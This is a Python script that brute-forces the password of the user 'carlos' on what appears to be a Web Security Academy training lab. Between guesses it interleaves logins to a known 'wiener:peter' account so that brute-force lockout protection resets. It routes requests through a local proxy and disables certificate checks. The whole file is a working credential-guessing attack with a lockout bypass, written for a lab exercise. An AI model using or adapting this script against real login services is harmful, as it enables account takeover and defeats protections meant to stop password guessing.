import requests
import warnings

from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

password_file='candidate_pass.txt'

target_url='https://0a6400d204d43c07c35224fe003d00a8.web-security-academy.net/login'
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
data={'username' : 'wiener' , 'password':'peter'}

def brute():
    i=0
    with open(password_file,'r') as f:
                for password in f.read().split("\n"):
                        data = {'username': 'carlos', 'password': password}
                        response=requests.post(url=target_url,data=data,proxies=proxies,verify=False)
                        i = i + 1
                       # print(i)
                        if "Incorrect password" in response.text:
                            print(f" carlos : {password} [-]")

                        elif "Incorrect password" not in response.text:
                            print(f"carlos : {password} .This is correct combination")
                            break
                        if i==2:
                            login()
                            i=0


def login():
    response=requests.post(url=target_url,data=data,proxies=proxies,verify=False)
    if response.status_code == 200:
        print("wiener : peter [+]")
        return
    else:
        print("there is a some problem")

if __name__ == "__main__":
    brute()